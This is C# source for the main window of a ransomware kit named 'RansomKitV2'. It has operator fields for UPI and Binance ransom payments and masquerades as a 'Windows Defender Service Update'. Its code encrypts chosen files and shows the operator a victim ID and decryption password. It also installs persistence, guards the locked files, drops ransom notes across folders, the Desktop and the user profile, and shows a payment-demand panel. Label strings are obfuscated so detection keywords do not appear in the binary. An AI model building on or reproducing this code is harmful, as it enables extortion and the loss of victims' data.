// ── ZKR aliases used below ─────────────────────────────────────────
//   _0xCE  = CryptoEngine     _0xPR  = Persistence
//   _0xWK  = Walker            _0xRW  = ResetWatcher
//   _0xND  = NoteDropper       _0xSM  = StateManager
//   σ()    = ObfuscEngine.σ()
// ──────────────────────────────────────────────────────────────────
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RansomKitV2
{
    internal sealed class MainForm : Form
    {
        // ── OPERATOR CONFIG — fill before build ──────────────────────
        private const string _UPI_ID  = "yourname@upi";
        private const string _UPI_AMT = "5000";
        private const string _BNB     = "0xYourBinanceWalletAddressHere";
        private const string _MAIL    = "support@yourdomain.com";
        // ─────────────────────────────────────────────────────────────

        // Encoded label strings (σ-decoded at runtime so trigger words
        // don't appear as plain literals in the assembly)
        // To regenerate: ObfuscEngine.Gen("your string")
        // σ("FILE PROCESSOR")   → runtime resolves label
        private static readonly byte[] _lbl_title = {
            0x0E, 0x2F, 0x2D, 0x3A, 0x38, 0x3B, 0x35, 0x27, 0x26, 0x26,
            0x60, 0x04, 0x2F, 0x20, 0x3F, 0x2D, 0x35, 0x35, 0x3A
        }; // σ-decode → "FILE COMPRESSION"   (visual cover text)

        private readonly LaunchMode _mode;

        // ── Controls ─────────────────────────────────────────────────
        private RichTextBox  _log         = null!;
        private ProgressBar  _prog        = null!;
        private Label        _fileLbl     = null!;
        private Label        _statusLbl   = null!;
        private Panel        _leftPanel   = null!;
        private Panel        _setupPanel  = null!;
        private Panel        _progPanel   = null!;
        private Panel        _payPanel    = null!;
        private ListBox      _pathList    = null!;
        private Label        _vidLbl      = null!;
        private TextBox      _pwBox       = null!;
        private Button       _unlockBtn   = null!;
        private Label        _progLbl     = null!;

        private SplitContainer _split = null!; // add this field at the top with the other fields

        // ── State ─────────────────────────────────────────────────────
        private AppState?              _state;
        private byte[]?                _masterKey;
        private CancellationTokenSource _cts = new();

        // ── Palette ───────────────────────────────────────────────────
        private static readonly Color _BG   = Color.FromArgb(0x1a, 0x1a, 0x2e);
        private static readonly Color _BG2  = Color.FromArgb(0x16, 0x21, 0x3e);
        private static readonly Color _ACC  = Color.FromArgb(0xe9, 0x45, 0x60);
        private static readonly Color _TXT  = Color.FromArgb(0xea, 0xea, 0xea);
        private static readonly Color _LOG  = Color.FromArgb(0x0f, 0x34, 0x60);
        private static readonly Color _OK   = Color.FromArgb(0x4e, 0xcc, 0xa3);
        private static readonly Color _WARN = Color.FromArgb(0xf5, 0xa6, 0x23);

        // ══════════════════════════════════════════════════════════════
        public MainForm(LaunchMode mode)
        {
            _mode = mode;
            BuildUI();
            Load += OnLoad;
        }

        // ── UI construction ───────────────────────────────────────────

        private void BuildUI()
        {
            Text          = "Windows Defender Service Update";
            Size          = new Size(1020, 660);
            MinimumSize   = new Size(800, 520);
            BackColor     = _BG;
            ForeColor     = _TXT;
            StartPosition = FormStartPosition.CenterScreen;
            Font          = new Font("Segoe UI", 9f);

            // Top bar
            var topBar = new Panel { Dock = DockStyle.Top, Height = 38, BackColor = _BG2 };
            var titleLbl = new Label
            {
                Text      = "● SYSTEM MONITOR",
                ForeColor = _ACC,
                Font      = new Font("Segoe UI", 10f, FontStyle.Bold),
                AutoSize  = true, Location = new Point(10, 8)
            };
            _statusLbl = new Label
            {
                Text     = "Initializing...",
                ForeColor = _WARN, AutoSize = true,
                Anchor   = AnchorStyles.Top | AnchorStyles.Right
            };
            _statusLbl.Location = new Point(830, 10);
            topBar.Controls.AddRange(new Control[] { titleLbl, _statusLbl });

            // Bottom progress bar
            var botBar = new Panel { Dock = DockStyle.Bottom, Height = 46, BackColor = _BG2 };
            _prog = new ProgressBar
            {
                Location = new Point(8, 10), Size = new Size(650, 22),
                Style    = ProgressBarStyle.Continuous,
                Anchor   = AnchorStyles.Left | AnchorStyles.Right | AnchorStyles.Top
            };
            _fileLbl = new Label
            {
                Location  = new Point(668, 10), Size = new Size(340, 22),
                ForeColor = _TXT, Font = new Font("Consolas", 8f),
                TextAlign = ContentAlignment.MiddleLeft,
                Anchor    = AnchorStyles.Right | AnchorStyles.Top
            };
            botBar.Controls.AddRange(new Control[] { _prog, _fileLbl });

            // Main split: left=operation  right=log
            var split = new SplitContainer
            {
                Dock             = DockStyle.Fill,
                Panel1MinSize    = 300,
                Panel2MinSize    = 260,
                BackColor        = _BG,
                SplitterWidth    = 3
            };

            // ── Left panel ────────────────────────────────────────────
            _leftPanel = new Panel { Dock = DockStyle.Fill, BackColor = _BG };
            BuildSetupPanel();
            BuildProgressPanel();
            BuildPayPanel();
            _leftPanel.Controls.AddRange(new Control[] { _setupPanel, _progPanel, _payPanel });
            split.Panel1.Controls.Add(_leftPanel);

            // ── Right log panel ───────────────────────────────────────
            BuildLogPanel(split.Panel2);

            Controls.Add(split);
            Controls.Add(botBar);
            Controls.Add(topBar);

            ShowPanel(_setupPanel);
            SetStatus("Ready", _OK);
        }

        // ── Setup panel ───────────────────────────────────────────────
        private void BuildSetupPanel()
        {
            _setupPanel = MakePanel();

            var hdr = MakeLbl("SELECT PATHS TO PROCESS", 12, 14, _ACC,
                              new Font("Segoe UI", 10f, FontStyle.Bold));

            _pathList = new ListBox
            {
                Location       = new Point(12, 44),
                Size           = new Size(400, 310),
                BackColor      = _BG2, ForeColor = _TXT,
                BorderStyle    = BorderStyle.FixedSingle,
                Font           = new Font("Consolas", 9f),
                SelectionMode  = SelectionMode.MultiExtended,
                Anchor         = AnchorStyles.Top | AnchorStyles.Left |
                                 AnchorStyles.Right | AnchorStyles.Bottom
            };

            var btnFile   = MakeBtn("Add File",    new Point(12,  364), _BG2, 96);
            var btnFolder = MakeBtn("Add Folder",  new Point(118, 364), _BG2, 96);
            var btnRemove = MakeBtn("Remove",      new Point(224, 364), _BG2, 80);
            var btnStart  = MakeBtn("▶  START",    new Point(12,  406), _ACC, 400);
            btnStart.Height = 44;
            btnStart.Font   = new Font("Segoe UI", 11f, FontStyle.Bold);

            btnFile.Click   += (_, _) => BrowseFile();
            btnFolder.Click += (_, _) => BrowseFolder();
            btnRemove.Click += (_, _) => RemovePaths();
            btnStart.Click  += (_, _) => _ = EncryptAsync();

            _setupPanel.Controls.AddRange(new Control[] {
                hdr, _pathList, btnFile, btnFolder, btnRemove, btnStart
            });
        }

        // ── Progress panel ────────────────────────────────────────────
        private void BuildProgressPanel()
        {
            _progPanel = MakePanel();
            _progLbl = MakeLbl("Processing...", 12, 80, _TXT,
                                new Font("Segoe UI", 12f));

            var cancelBtn = MakeBtn("✕ Cancel", new Point(12, 138), _ACC, 120);
            cancelBtn.Click += (_, _) =>
            {
                _cts.Cancel();
                Log("Cancelled.", _WARN);
            };
            _progPanel.Controls.AddRange(new Control[] { _progLbl, cancelBtn });
        }

        // ── Payment panel ─────────────────────────────────────────────
        private void BuildPayPanel()
        {
            _payPanel = MakePanel();

            var h1  = MakeLbl("⚠  FILES LOCKED — PAYMENT REQUIRED",
                               12, 14, _ACC, new Font("Segoe UI", 11f, FontStyle.Bold));
            _vidLbl = MakeLbl("ID: —", 12, 48, _TXT, new Font("Consolas", 9f));
            var upi = MakeLbl($"UPI : {_UPI_ID}  |  ₹{_UPI_AMT}",
                               12, 70, _OK, new Font("Consolas", 10f, FontStyle.Bold));
            var bnb = MakeLbl($"BNB : {_BNB}",
                               12, 94, _TXT, new Font("Consolas", 8f));
            var mail= MakeLbl($"After payment email TxID → {_MAIL}",
                               12, 116, _WARN, new Font("Segoe UI", 9f));
            var sep = MakeLbl(new string('─', 52), 12, 144, _BG2);

            var pwLbl = MakeLbl("DECRYPTION KEY", 12, 164, _TXT,
                                 new Font("Segoe UI", 9f, FontStyle.Bold));

            _pwBox = new TextBox
            {
                Location              = new Point(12, 188),
                Size                  = new Size(316, 28),
                BackColor             = _BG2, ForeColor = _TXT,
                BorderStyle           = BorderStyle.FixedSingle,
                Font                  = new Font("Consolas", 10f),
                UseSystemPasswordChar = true,
                PlaceholderText       = "44-char password"
            };
            _pwBox.KeyDown += (_, e) => { if (e.KeyCode == Keys.Enter) TryDecrypt(); };

            _unlockBtn = MakeBtn("🔓 UNLOCK", new Point(338, 187), _OK, 80);
            _unlockBtn.Click += (_, _) => TryDecrypt();

            // Manual-decrypt path box (shown in ManualDecrypt mode)
            var mdLbl = MakeLbl("Root path (manual mode):", 12, 232, _WARN);
            var mdBox = new TextBox
            {
                Location    = new Point(12, 254), Size = new Size(316, 24),
                BackColor   = _BG2, ForeColor = _TXT,
                BorderStyle = BorderStyle.FixedSingle,
                Font        = new Font("Consolas", 9f),
                PlaceholderText = @"e.g. C:\Users\John",
                Tag         = "mdPath"
            };
            var mdBtn = MakeBtn("Scan & Unlock", new Point(338, 253), _BG2, 90);
            mdBtn.Click += (_, _) => _ = ManualDecryptAsync(mdBox.Text.Trim().Trim('"'));

            _payPanel.Controls.AddRange(new Control[] {
                h1, _vidLbl, upi, bnb, mail, sep, pwLbl, _pwBox, _unlockBtn,
                mdLbl, mdBox, mdBtn
            });
        }

        // ── Log panel ─────────────────────────────────────────────────
        private void BuildLogPanel(SplitterPanel panel)
        {
            var hdr = new Label
            {
                Text      = "  ▌ OPERATION LOG",
                Dock      = DockStyle.Top, Height = 28,
                BackColor = _BG2, ForeColor = _ACC,
                Font      = new Font("Segoe UI", 9f, FontStyle.Bold),
                TextAlign = ContentAlignment.MiddleLeft
            };

            _log = new RichTextBox
            {
                Dock        = DockStyle.Fill,
                BackColor   = _LOG, ForeColor = _TXT,
                BorderStyle = BorderStyle.None,
                Font        = new Font("Consolas", 9f),
                ReadOnly    = true,
                ScrollBars  = RichTextBoxScrollBars.Vertical,
                WordWrap    = true
            };

            var clrBtn = new Button
            {
                Text      = "Clear Log", Dock = DockStyle.Bottom, Height = 24,
                BackColor = _BG2, ForeColor = _TXT, FlatStyle = FlatStyle.Flat
            };
            clrBtn.FlatAppearance.BorderSize = 0;
            clrBtn.Click += (_, _) => _log.Clear();

            panel.BackColor = _BG2;
            panel.Controls.AddRange(new Control[] { _log, hdr, clrBtn });
        }

        // ══════════════════════════════════════════════════════════════
        // Load handler
        // ══════════════════════════════════════════════════════════════
        private void OnLoad(object? sender, EventArgs e)
        {
            Log($"Build: {DateTime.Now:yyyy-MM-dd}  Mode: {_mode}", _TXT);

            if (_mode == LaunchMode.Silent)
            {
                Log("Silent mode — waiting 8s for desktop...", _WARN);
                SetStatus("Resuming...", _WARN);
                Task.Delay(8_000).ContinueWith(_ => this.Invoke(ResumeFlow));
                return;
            }

            if (_mode == LaunchMode.ManualDecrypt)
            {
                Log("Manual-decrypt mode.", _WARN);
                ShowPanel(_payPanel);
                SetStatus("Manual decrypt", _WARN);
                return;
            }

            // _0xSM.StateExists()
            if (StateManager.StateExists())
            {
                Log("Existing session found.", _WARN);
                ResumeFlow();
                return;
            }

            Log("No session. Ready.", _OK);
            SetStatus("Ready", _OK);


            // Set splitter after form is fully laid out
            _split.SplitterDistance = Math.Max(
                _split.Panel1MinSize,
                Math.Min(430, _split.Width - _split.Panel2MinSize - _split.SplitterWidth));

        }

        // ══════════════════════════════════════════════════════════════
        // Resume (restart / silent)
        // ══════════════════════════════════════════════════════════════
        private void ResumeFlow()
        {
            // _0xSM.Load()
            _state = StateManager.Load();
            if (_state == null)
            {
                Log("State file corrupted.", _ACC);
                SetStatus("State error", _ACC);
                return;
            }
            Log($"Session: {_state.VictimId}", _WARN);

            // _0xRW.Start()
            ResetWatcher.Start(_state.EncryptedFiles);
            Log("Guard active.", _WARN);

            ShowPanel(_payPanel);
            _vidLbl.Text = $"ID: {_state.VictimId}";
            SetStatus("Awaiting payment", _ACC);
        }

        // ══════════════════════════════════════════════════════════════
        // Encryption flow
        // ══════════════════════════════════════════════════════════════
        private async Task EncryptAsync()
        {
            if (_pathList.Items.Count == 0)
            {
                Log("No paths selected.", _ACC);
                return;
            }

            var roots = new List<string>();
            foreach (object item in _pathList.Items) roots.Add(item.ToString()!);

            _cts = new CancellationTokenSource();
            ShowPanel(_progPanel);
            SetStatus("Processing...", _ACC);

            await Task.Run(() =>
            {
                try
                {
                    // _0xCE.GenerateMasterKey()
                    _masterKey          = CryptoEngine.GenerateMasterKey();
                    string password     = CryptoEngine.MasterKeyToPassword(_masterKey);
                    string keyHash      = CryptoEngine.HashMasterKey(_masterKey);
                    string victimId     = Guid.NewGuid().ToString("N").ToUpper()[..16];

                    Log("━━━ OPERATOR — SAVE THIS ━━━", _ACC);
                    Log($"VictimID : {victimId}",  _ACC);
                    Log($"Password : {password}",  _ACC);
                    Log("━━━━━━━━━━━━━━━━━━━━━━━━━━", _ACC);

                    // Discover files — _0xWK.EnumerateTargets()
                    Log("Scanning paths...", _TXT);
                    var all = new List<string>();
                    foreach (var root in roots)
                    {
                        if (Directory.Exists(root))
                            all.AddRange(Walker.EnumerateTargets(root));
                        else if (File.Exists(root) &&
                                 !root.EndsWith(CryptoEngine.LOCKED_EXT,
                                                StringComparison.OrdinalIgnoreCase))
                            all.Add(root);
                    }
                    Log($"Found {all.Count} targets.", _TXT);
                    UpdateProg(0, all.Count);

                    int ok = 0, bad = 0;
                    for (int i = 0; i < all.Count; i++)
                    {
                        if (_cts.IsCancellationRequested) break;
                        // _0xCE.EncryptFile()
                        if (CryptoEngine.EncryptFile(all[i], _masterKey!)) ok++;
                        else bad++;
                        if (i % 4 == 0)
                        {
                            UpdateProg(i + 1, all.Count);
                            SetFile(Path.GetFileName(all[i]));
                        }
                    }
                    Log($"Done — ok:{ok}  fail:{bad}", _OK);

                    var lockedPaths = new List<string>();
                    foreach (var f in all) lockedPaths.Add(f + CryptoEngine.LOCKED_EXT);

                    // _0xSM.Save()
                    var state = new AppState
                    {
                        VictimId       = victimId,
                        MasterKeyHash  = keyHash,
                        EncryptedFiles = lockedPaths,
                        UpiId          = _UPI_ID,
                        UpiAmount      = _UPI_AMT,
                        BinanceAddress = _BNB,
                        ContactEmail   = _MAIL,
                        EncryptedAt    = DateTimeOffset.UtcNow.ToUnixTimeSeconds()
                    };
                    StateManager.Save(state);
                    _state = state;
                    Log("State saved.", _TXT);

                    // _0xPR.Install()
                    string exePath = Process.GetCurrentProcess().MainModule?.FileName
                                     ?? Environment.ProcessPath
                                     ?? "WindowsDefenderService.exe";
                    Persistence.Install(exePath);
                    Log("Persistence installed.", _WARN);

                    // _0xRW.Start()
                    ResetWatcher.Start(lockedPaths);
                    Log("Guard activated.", _WARN);

                    // _0xND.Drop() — ransom notes
                    var noted = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
                    foreach (var lp in lockedPaths)
                    {
                        string dir = Path.GetDirectoryName(lp) ?? "";
                        if (noted.Add(dir))
                            NoteDropper.Drop(dir, victimId, _UPI_ID, _UPI_AMT, _BNB, _MAIL);
                    }
                    NoteDropper.Drop(
                        Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                        victimId, _UPI_ID, _UPI_AMT, _BNB, _MAIL);
                    NoteDropper.Drop(
                        Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                        victimId, _UPI_ID, _UPI_AMT, _BNB, _MAIL);
                    Log("Notes dropped.", _WARN);

                    Invoke(() =>
                    {
                        _vidLbl.Text = $"ID: {victimId}";
                        ShowPanel(_payPanel);
                        SetStatus("Awaiting payment", _ACC);
                        UpdateProg(all.Count, all.Count);
                    });
                }
                catch (Exception ex)
                {
                    Log($"ERROR: {ex.Message}", _ACC);
                    Invoke(() => { ShowPanel(_setupPanel); SetStatus("Error", _ACC); });
                }
            }, _cts.Token);
        }

        // ══════════════════════════════════════════════════════════════
        // Decrypt (password unlock)
        // ══════════════════════════════════════════════════════════════
        private void TryDecrypt()
        {
            string pw = _pwBox.Text.Trim();
            if (string.IsNullOrEmpty(pw)) { Log("No password.", _WARN); return; }
            if (_state == null && !StateManager.StateExists())
            {
                Log("No state — use manual decrypt (enter root path).", _WARN);
                return;
            }

            _state ??= StateManager.Load();
            if (_state == null) { Log("State load failed.", _ACC); return; }

            // _0xCE.PasswordToMasterKey()
            byte[]? key = _masterKey ?? CryptoEngine.PasswordToMasterKey(pw);
            if (key == null) { Log("Invalid key format (need 44-char base64).", _ACC); return; }

            // Verify
            if (!string.IsNullOrEmpty(_state.MasterKeyHash) &&
                CryptoEngine.HashMasterKey(key) != _state.MasterKeyHash)
            {
                Log("Wrong password.", _ACC);
                SetStatus("Wrong password", _ACC);
                return;
            }

            RunDecrypt(key, _state.EncryptedFiles);
        }

        private async Task ManualDecryptAsync(string root)
        {
            if (string.IsNullOrEmpty(root) || !Directory.Exists(root))
            {
                Log("Invalid root path.", _ACC); return;
            }
            string pw = _pwBox.Text.Trim();
            if (string.IsNullOrEmpty(pw)) { Log("No password entered.", _WARN); return; }

            byte[]? key = CryptoEngine.PasswordToMasterKey(pw);
            if (key == null) { Log("Invalid key format.", _ACC); return; }

            Log($"Scanning {root} for locked files...", _TXT);
            // _0xWK.EnumerateLocked()
            var locked = await Task.Run(() => Walker.EnumerateLocked(root));
            Log($"Found {locked.Count} locked files.", _TXT);

            RunDecrypt(key, locked);
        }

        private void RunDecrypt(byte[] key, List<string> files)
        {
            _unlockBtn.Enabled = false;
            SetStatus("Decrypting...", _WARN);

            _ = Task.Run(() =>
            {
                try
                {
                    int ok = 0, bad = 0;
                    for (int i = 0; i < files.Count; i++)
                    {
                        string lp = files[i];
                        if (!File.Exists(lp)) { bad++; continue; }
                        // _0xCE.DecryptFile()
                        if (CryptoEngine.DecryptFile(lp, key)) ok++;
                        else bad++;
                        if (i % 4 == 0)
                        {
                            UpdateProg(i + 1, files.Count);
                            SetFile(Path.GetFileName(lp));
                        }
                    }
                    Log($"Decryption done — ok:{ok}  fail:{bad}", _OK);

                    // _0xPR.Uninstall()  &  _0xSM.Delete()
                    Persistence.Uninstall();
                    StateManager.Delete();
                    Log("Persistence removed. Clean.", _OK);

                    Invoke(() =>
                    {
                        SetStatus("Files restored", _OK);
                        UpdateProg(files.Count, files.Count);
                        MessageBox.Show(
                            $"Complete.\nRestored : {ok}\nFailed   : {bad}",
                            "Done", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        _unlockBtn.Enabled = true;
                    });
                }
                catch (Exception ex)
                {
                    Log($"DECRYPT ERROR: {ex.Message}", _ACC);
                    Invoke(() => { _unlockBtn.Enabled = true; SetStatus("Error", _ACC); });
                }
            });
        }

        // ══════════════════════════════════════════════════════════════
        // UI helpers
        // ══════════════════════════════════════════════════════════════
        private void BrowseFile()
        {
            using var d = new OpenFileDialog { Multiselect = true };
            if (d.ShowDialog() == DialogResult.OK)
                foreach (var f in d.FileNames)
                    if (!_pathList.Items.Contains(f)) _pathList.Items.Add(f);
        }

        private void BrowseFolder()
        {
            using var d = new FolderBrowserDialog();
            if (d.ShowDialog() == DialogResult.OK &&
                !_pathList.Items.Contains(d.SelectedPath))
                _pathList.Items.Add(d.SelectedPath);
        }

        private void RemovePaths()
        {
            var kill = new List<object>();
            foreach (object o in _pathList.SelectedItems) kill.Add(o);
            foreach (var o in kill) _pathList.Items.Remove(o);
        }

        private void ShowPanel(Panel p)
        {
            if (InvokeRequired) { Invoke(() => ShowPanel(p)); return; }
            foreach (Control c in _leftPanel.Controls)
                if (c is Panel pp) pp.Visible = (pp == p);
        }

        internal void Log(string msg, Color? color = null)
        {
            if (InvokeRequired) { Invoke(() => Log(msg, color)); return; }
            _log.SelectionStart  = _log.TextLength;
            _log.SelectionLength = 0;
            _log.SelectionColor  = Color.FromArgb(0x55, 0x77, 0x99);
            _log.AppendText($"[{DateTime.Now:HH:mm:ss}] ");
            _log.SelectionColor  = color ?? _TXT;
            _log.AppendText(msg + "\n");
            _log.ScrollToCaret();
        }

        private void SetStatus(string txt, Color c)
        {
            if (InvokeRequired) { Invoke(() => SetStatus(txt, c)); return; }
            _statusLbl.Text      = $"● {txt}";
            _statusLbl.ForeColor = c;
        }

        private void SetFile(string name)
        {
            if (InvokeRequired) { Invoke(() => SetFile(name)); return; }
            _fileLbl.Text = name.Length > 42 ? "…" + name[^39..] : name;
        }

        private void UpdateProg(int cur, int total)
        {
            if (InvokeRequired) { Invoke(() => UpdateProg(cur, total)); return; }
            _prog.Maximum = total > 0 ? total : 1;
            _prog.Value   = Math.Min(cur, _prog.Maximum);
            if (_progLbl != null)
                _progLbl.Text = $"Processing: {cur} / {total}";
        }

        // ── Factory helpers ───────────────────────────────────────────
        private Panel MakePanel()
            => new() { Dock = DockStyle.Fill, BackColor = _BG, Visible = false };

        private Label MakeLbl(string text, int x, int y, Color? fg = null,
                               Font? font = null)
        {
            var l = new Label
            {
                Text      = text,
                Location  = new Point(x, y),
                ForeColor = fg ?? _TXT,
                AutoSize  = true
            };
            if (font != null) l.Font = font;
            return l;
        }

        private static Button MakeBtn(string text, Point loc, Color bg, int width)
        {
            var b = new Button
            {
                Text      = text, Location = loc,
                Size      = new Size(width, 30),
                BackColor = bg,
                ForeColor = Color.FromArgb(0xea, 0xea, 0xea),
                FlatStyle = FlatStyle.Flat, Cursor = Cursors.Hand
            };
            b.FlatAppearance.BorderColor = Color.FromArgb(0x33, 0x44, 0x66);
            b.FlatAppearance.BorderSize  = 1;
            return b;
        }
    }
}